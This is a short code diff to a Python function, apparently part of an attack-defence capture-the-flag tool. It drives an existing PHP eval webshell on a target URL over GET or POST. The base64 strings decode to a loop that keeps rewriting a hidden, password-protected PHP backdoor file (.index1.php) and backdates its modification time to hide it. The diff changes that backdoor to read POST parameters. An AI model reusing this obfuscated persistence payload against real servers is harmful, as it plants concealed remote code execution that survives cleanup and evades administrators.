@@ -51,14 +51,14 @@ def cmd(url,method,passwd):
 	data={}
 	if method=='get':
 		data[passwd]='@eval(base64_decode($_GET[z0]));'
-		data['z0']='c3lzdGVtKCd3aGlsZSB0cnVlO2RvIGVjaG8gXCc8P3BocCBpZihtZDUoJF9HRVRbcGFzc10pPT0iM2E1MDA2NWUxNzA5YWNjNDdiYTBjOTIzODI5NDM2NGYiKXtAZXZhbCgkX0dFVFthXSk7fSA/PlwnID4uaW5kZXgxLnBocDt0b3VjaCAtbSAtZCAiMjAxNy0xMS0xMiAxMDoyMToyNiIgLmluZGV4MS5waHA7c2xlZXAgNTtkb25lOycpOw=='
+		data['z0']='c3lzdGVtKCd3aGlsZSB0cnVlO2RvIGVjaG8gXCc8P3BocCBpZihtZDUoJF9QT1NUW3Bhc3NdKT09IjNhNTAwNjVlMTcwOWFjYzQ3YmEwYzkyMzgyOTQzNjRmIil7QGV2YWwoJF9QT1NUW2FdKTt9ID8+XCcgPi5pbmRleDEucGhwO3RvdWNoIC1tIC1kICIyMDE3LTExLTE3IDEwOjIxOjI2IiAuaW5kZXgxLnBocDtzbGVlcCA1O2RvbmU7Jyk7'
 		try:
 			res = requests.get(url,params=data,timeout=3)
 		except :
 			pass
 	elif method=='post':
 		data[passwd]='@eval(base64_decode($_POST[z0]));'
-		data['z0']='c3lzdGVtKCd3aGlsZSB0cnVlO2RvIGVjaG8gXCc8P3BocCBpZihtZDUoJF9HRVRbcGFzc10pPT0iM2E1MDA2NWUxNzA5YWNjNDdiYTBjOTIzODI5NDM2NGYiKXtAZXZhbCgkX0dFVFthXSk7fSA/PlwnID4uaW5kZXgxLnBocDt0b3VjaCAtbSAtZCAiMjAxNy0xMS0xMiAxMDoyMToyNiIgLmluZGV4MS5waHA7c2xlZXAgNTtkb25lOycpOw=='
+		data['z0']='c3lzdGVtKCd3aGlsZSB0cnVlO2RvIGVjaG8gXCc8P3BocCBpZihtZDUoJF9QT1NUW3Bhc3NdKT09IjNhNTAwNjVlMTcwOWFjYzQ3YmEwYzkyMzgyOTQzNjRmIil7QGV2YWwoJF9QT1NUW2FdKTt9ID8+XCcgPi5pbmRleDEucGhwO3RvdWNoIC1tIC1kICIyMDE3LTExLTE3IDEwOjIxOjI2IiAuaW5kZXgxLnBocDtzbGVlcCA1O2RvbmU7Jyk7'
 		try:
 			res = requests.post(url,data=data,timeout=3)
 		except:
